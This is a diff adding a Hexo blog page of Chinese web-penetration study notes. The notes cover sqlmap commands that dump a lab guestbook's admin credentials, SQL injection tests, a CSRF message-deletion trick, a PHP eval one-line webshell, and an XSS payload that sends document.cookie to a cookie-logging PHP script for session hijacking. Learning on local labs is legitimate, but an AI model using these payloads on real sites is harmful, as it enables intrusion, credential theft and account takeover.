@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>web渗透学习 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="服务端动态脚本指放在服务器端才能运行的语言，，每种语言都需要服务器端环境支撑。像asp需要lis，php需要Apache等等。在本地端能用本地浏览器打开的网页像HTML，htm，shtml都属于静态,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://little-caiyin.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">web渗透学习</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">web渗透学习</h1>
+        <div class="stuff">
+            <span>五月 27, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="服务端动态脚本"><a href="#服务端动态脚本" class="headerlink" title="服务端动态脚本"></a>服务端动态脚本</h3><p>指放在服务器端才能运行的语言，，每种语言都需要服务器端环境支撑。像asp需要lis，php需要Apache等等。在本地端能用本地浏览器打开的网页像HTML，htm，shtml都属于静态。服务端的动态脚本语言种类：</p>
+<p><img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210527205846660.png" alt="image-20210527205846660"></p>
+<h3 id="最流行，占市场率最高的php语言"><a href="#最流行，占市场率最高的php语言" class="headerlink" title="最流行，占市场率最高的php语言"></a>最流行，占市场率最高的php语言</h3><p>搭建环境</p>
+<h3 id="漏洞环境原理"><a href="#漏洞环境原理" class="headerlink" title="漏洞环境原理"></a>漏洞环境原理</h3><p>SQL注入（数据库注入）</p>
+<p>因相当大一部分程序员在编写代码时没有对用户输入数据的合法性进行判断，使得应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即<strong>SQL注入</strong>。</p>
+<p>还需要明白：SQL注入攻击的不是像php这样的动态语言本身，而是它背后的数据库。所有的服务端动态脚本语言都可以连接数据库，像aspx连接mssql、php常用的是mysql，jsp是oracle等等。</p>
+<h3 id="SQL注入需要的工具"><a href="#SQL注入需要的工具" class="headerlink" title="SQL注入需要的工具"></a>SQL注入需要的工具</h3><p>Windows：1.python27，sqlmap需要 2.sqlmap。下载完解压所有文件到一个目录就行，好比解压到d:/sqlmap。该工具用python语言写的，支持跨平台运行，具有一百多个命令行参数。你会安装后，你就会了系统和python环境配置。如果你能掌握所有的参数后，我相信你已经对最流行的数据库注入攻击有了相当深的了解了。Sqlmap是注入神器，有了它你可以扔掉所有注入工具了，它也是个撩妹高手，因为它基本支持了市面上所有数据库，并且注入的姿势（Payload）花样繁多，让你眼花缭乱的。</p>
+<p>在这里假设你的python27装在c:/python27，你的sqlmap解压在d:/sqlmap，你可以在命令行底下先执行一条命令就可以直接调用了，命令如下：path=c:/python27;d:/sqlmap</p>
+<p><img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210527221531921.png" alt="image-20210527221531921"></p>
+<h3 id="实例讲解sqlmap最基本用法"><a href="#实例讲解sqlmap最基本用法" class="headerlink" title="实例讲解sqlmap最基本用法"></a>实例讲解sqlmap最基本用法</h3><h4 id="请注意在注入过程中-D、-T、-C这三个库、表、字段的参数都是用大写的，查询结果不用。要查询某个结果，参数前都用–的，像–tables。"><a href="#请注意在注入过程中-D、-T、-C这三个库、表、字段的参数都是用大写的，查询结果不用。要查询某个结果，参数前都用–的，像–tables。" class="headerlink" title="请注意在注入过程中-D、-T、-C这三个库、表、字段的参数都是用大写的，查询结果不用。要查询某个结果，参数前都用–的，像–tables。"></a>请注意在注入过程中-D、-T、-C这三个库、表、字段的参数都是用大写的，查询结果不用。要查询某个结果，参数前都用–的，像–tables。</h4><h4 id="1，检测漏洞：运行："><a href="#1，检测漏洞：运行：" class="headerlink" title="1，检测漏洞：运行："></a>1，检测漏洞：运行：</h4><p>c:/python27/python.exe d:/sqlmap/sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a></p>
+<p>或path=c:/python27;d:/sqlmap再sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a></p>
+<p>-u参数是表示后边要跟着的网站链接(URL)，如果后边的URL像是”1.php?id=2&amp;name=3”里边有两个&amp;符号的，在windows下请把URL用双引号引起来，如果在linux下倒是不用。回车后，如果出现询问Y/n的，你一直按下回车键就行了。按回车就表示Y，输入n表示不同意。</p>
+<h4 id="2，用参数–dbs得到我们注入网站的所有库名"><a href="#2，用参数–dbs得到我们注入网站的所有库名" class="headerlink" title="2，用参数–dbs得到我们注入网站的所有库名"></a>2，用参数–dbs得到我们注入网站的所有库名</h4><p>运行：c:/python27/python.exe d:/sqlmap/sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a> –dbs</p>
+<p>如果只想得到当前网站的当前库名，参数–dbs换成–current-db</p>
+<h4 id="3，用参数-D-test-–tables得到test库里的所有表名"><a href="#3，用参数-D-test-–tables得到test库里的所有表名" class="headerlink" title="3，用参数-D test –tables得到test库里的所有表名"></a>3，用参数-D test –tables得到test库里的所有表名</h4><p>运行：c:/python27/python.exe d:/sqlmap/sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a> -D test –tables</p>
+<h4 id="4，用参数-D-test-T-manger-users-–columns得到数据库test中的manger-users表里所有列名"><a href="#4，用参数-D-test-T-manger-users-–columns得到数据库test中的manger-users表里所有列名" class="headerlink" title="4，用参数-D test -T manger-users –columns得到数据库test中的manger-users表里所有列名"></a>4，用参数-D test -T manger-users –columns得到数据库test中的manger-users表里所有列名</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/python27/python.exe d:/sqlmap/sqlmap.py -u http://localhost/book/admin/lyedit.php?ly_id=2 -D test -T manger-users --columns</span><br></pre></td></tr></table></figure>
+<h4 id="5，运行-D-test-T-manger-users-C-user-name-user-pw-–dump得到user-name和user-pw字段里的值"><a href="#5，运行-D-test-T-manger-users-C-user-name-user-pw-–dump得到user-name和user-pw字段里的值" class="headerlink" title="5，运行-D test -T manger-users -C user_name,user_pw –dump得到user-name和user_pw字段里的值"></a>5，运行-D test -T manger-users -C user_name,user_pw –dump得到user-name和user_pw字段里的值</h4><p>`c:/python27/python.exe d:/sqlmap/sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a> -D test -T manger-users -C user_name,user_pw –dump</p>
+<p>请注意上图中也有询问Y/n的，大体意思都是询问我们是否要调用sqlmap自动破解md5密码的。我们并不需要，直接输入n。</p>
+<p>我们通过注入最终得到了留言本管理员的用户名和密码，我们直接打开“<a target="_blank" rel="noopener" href="http://localhost/book/admin%E2%80%9D%E5%B0%B1%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%B0%B1%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0%E4%BA%86%E3%80%82%E5%BD%93%E7%84%B6%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BC%9A%E6%94%B9%E5%90%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E4%B8%80%E4%BA%9B%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E7%9A%84%E5%90%8E%E5%8F%B0">http://localhost/book/admin”就输入用户名和密码就进入后台了。当然有的网站的后台会改名，我们需要一些后台扫描工具来找到网站的后台</a></p>
+<p>攻击参数</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://10.240.138.212/DVWA-1.9/vulnerabilities/sqli/">http://10.240.138.212/DVWA-1.9/vulnerabilities/sqli/</a>  ?id=1 &amp;Submit#” -p “id” –cookie “cookie参数” </p>
+<p><img src="https://img-blog.csdn.net/2018072014550421?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p><strong>SQL盲注</strong>：数据库的执行结果不会直接显示在页面上，页面的结果只会显示真和假两种状态</p>
+<p>三种注入POC;判断闭合方式</p>
+<p>…where user_id = $id     =》     …where user_id = 1 and 1024=1025</p>
+<p>…where user_id =’ $id’     =》     …where user_id = ‘1’ and ‘1024’=’1025’</p>
+<p>…where user_id = ‘’$id’’     =》     …where user_id = ‘’1’’ and ‘’1024’’=’’1025’’</p>
+<h3 id="CSRF漏洞-初体验"><a href="#CSRF漏洞-初体验" class="headerlink" title="CSRF漏洞  初体验"></a>CSRF漏洞  初体验</h3><p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://localhost/book/admin/lyedit.php?ly_id=2">http://localhost/book/admin/lyedit.php?ly_id=2</a> -p ly_id（可直接用此命令得到后台管理员的用户名和密码）</p>
+<p><strong>CSRF概念</strong>：CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<p><strong>例子：</strong>直接发送链接后让管理员自动删掉这个留言本的一条留言。</p>
+<p>我们进入留言本的后台留言管理，右键在删除留言上点击复制链接，会得到链接：<a target="_blank" rel="noopener" href="http://localhost/book/admin/ly_manage.php?act=del&amp;ly_id=5">http://localhost/book/admin/ly_manage.php?act=del&amp;ly_id=5</a></p>
+<p>我们在留言本主页面留言，在头像哪儿输入：</p>
+<p><img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210528162919676.png" alt="image-20210528162919676"></p>
+<p>上面 window.location.href 是调用JS让浏览器页面自动转向到删除页面。</p>
+<p>我们提交后，等到管理员登陆后台查看留言时就会自动删除“ly_id=5”的留言了，起到了一个破坏作用。如果你做了这次测试，发现留言本不好用了，请用root、root登陆“<a target="_blank" rel="noopener" href="http://localhost/phpmyadmin%E2%80%9D%EF%BC%8C%E5%88%A0%E6%8E%89test%E5%BA%93%E4%B8%ADly%E8%A1%A8%E9%87%8C%E4%BD%A0%E6%8F%90%E4%BA%A4%E7%9A%84%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE%E3%80%82">http://localhost/phpmyadmin”，删掉test库中ly表里你提交的恶意数据。</a></p>
+<img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210528173857921.png" alt="image-20210528173857921" style="zoom:80%;" />
+
+
+
+<h3 id="HTTP请求里的GET和POST"><a href="#HTTP请求里的GET和POST" class="headerlink" title="HTTP请求里的GET和POST"></a>HTTP请求里的GET和POST</h3><h4 id="1、GET：获取一个文档-一个页面，一个图像"><a href="#1、GET：获取一个文档-一个页面，一个图像" class="headerlink" title="1、GET：获取一个文档,一个页面，一个图像"></a>1、GET：获取一个文档,一个页面，一个图像</h4><p>大部分被传输到浏览器的html，images，js，css, … 都是通过GET方法发出请求的。它是获取数据的主要方法。 在浏览器地址栏直接打开的网址都是GET请求。</p>
+<h4 id="2、POST：发送数据至服务器"><a href="#2、POST：发送数据至服务器" class="headerlink" title="2、POST：发送数据至服务器"></a>2、POST：发送数据至服务器</h4><p>尽管可以通过GET方法将数据附加到url中传送给服务器，但在很多情况下使用POST发送数据给服务器更加合适。通过GET发送大量数据是不现实的，它有一定的局限性。用POST请求来发送表单数据是普遍的做法。简而言之，浏览网页一般都是GET请求；注册论坛注册邮箱、注册头条号之类或是用微信登陆头条号一般都是POST请求。<strong>注意：</strong>GET请求可以跨域、POST请求不可以跨域。</p>
+<h3 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h3><p>1，Cookie：有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行跟踪而储存在用户本地终端上的数据。简单来讲，这东西是存贮在你电脑或手机上的，是可以清理掉的。为什么你登陆了今日头条后，不需要再登陆就是它在起作用，我们客户端是可以清理或按网站格式伪造的Cookie。</p>
+<p>2，Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。</p>
+<p>简地讲cookie和session的作用是一样的，不过一个在本地你的电脑端贮存，一个在服务器上贮存。cookie你可以随时伪造修改，session如果你没有拿到网站权限时是不可以的。</p>
+<h3 id="黑盒渗透实战拿到网站权限"><a href="#黑盒渗透实战拿到网站权限" class="headerlink" title="黑盒渗透实战拿到网站权限"></a>黑盒渗透实战拿到网站权限</h3><p><strong>黑盒渗透：</strong>指在没有网站源码的情况下进行渗透测试；如果分析网站源码找到漏洞攻击，黑客界的行话叫作白盒<strong>代码审计</strong></p>
+<p><strong>Webshell</strong>：指的是通过黑客手段在服务器上放一个asp、php、jsp或其它格式的动态脚本，对网站有了基本的网页修改、数据库控制、执行命令等低权限操作。</p>
+<h4 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h4><p>前端漏洞：钓鱼、暗链、xss、点击劫持、csrf、url跳转。后端漏洞：sql注入、命令注入、文件上传、文件包含、暴力破解</p>
+<h4 id="常见的web漏洞"><a href="#常见的web漏洞" class="headerlink" title="常见的web漏洞"></a>常见的web漏洞</h4><p><strong>XSS</strong> who stole my keys  概念：黑客通过”html注入”篡改网页，**插入了恶意脚本(即xss脚本)**，当用户在浏览网页时，实现控制用户浏览器行为的一种攻击方式。危害：盗取用户信息/钓鱼/制造蠕虫等</p>
+<p>三种类型 ：存储型/反射型/DOM型  </p>
+<p>存储型：攻击代码位置：数据库；输出：HTTP响应</p>
+<p>反射型：攻击代码位置：url     ；输出：HTTP响应。</p>
+<p>DOM型：攻击代码位置：url    ；输出：DOM节点。  </p>
+<p><img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210528173450159.png" alt="image-20210528173450159"></p>
+<p>传统web站点渗透测试基本步骤</p>
+<p><img src="C:\Users\sleepy\AppData\Roaming\Typora\typora-user-images\image-20210528174516062.png" alt="image-20210528174516062"></p>
+<h4 id="SQL逐入漏洞"><a href="#SQL逐入漏洞" class="headerlink" title="SQL逐入漏洞"></a>SQL逐入漏洞</h4><p>sqlmap 发现和利用sql注入漏洞基本流程：1，找到有数据库交互的功能页面(如：xxx/artist.php?artist=1    问号+参数) 2，判断页面是否存在sql注入(artist=1’ 报错存在注入) 3，利用sql注入漏洞读取数据</p>
+<p><strong>进行注入尝试</strong>：GET/POST</p>
+<p><img src="https://img-blog.csdn.net/20180718114314485?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p><img src="https://img-blog.csdn.net/20180718152041276?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p>写入webshell</p>
+<p>php——一句话木马<?php@eval($_GET['cmd'])?></p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>客户端代码注入，通常注入代码是js脚本；能弹窗就说明存在xss</p>
+<p>反射型：建立一个cookie.php文件，放入数据库根目录下(localhost/)</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="selector-tag">php</span></span><br><span class="line">$cookie=$_GET[&#x27;cookie&#x27;];</span><br><span class="line">file_put_contents(&#x27;cookie.txt&#x27;,$cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>插入弹窗脚本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">弹窗，说明存在xss</span><br></pre></td></tr></table></figure>
+<p>替换成远程盗取cookie的语句，<script>document.location='<a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.php%EF%BC%9Fcookie=&#39;+document.cookie">http://127.0.0.1/cookie.php？cookie=&#39;+document.cookie</a>;</script>进行URL编码后即可在本地服务器指定位置(localhost/)下得到(hacked)用户的cookie跳转到登陆页面，更换cookie，直接访问首页(login.php  -&gt;  index.php)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
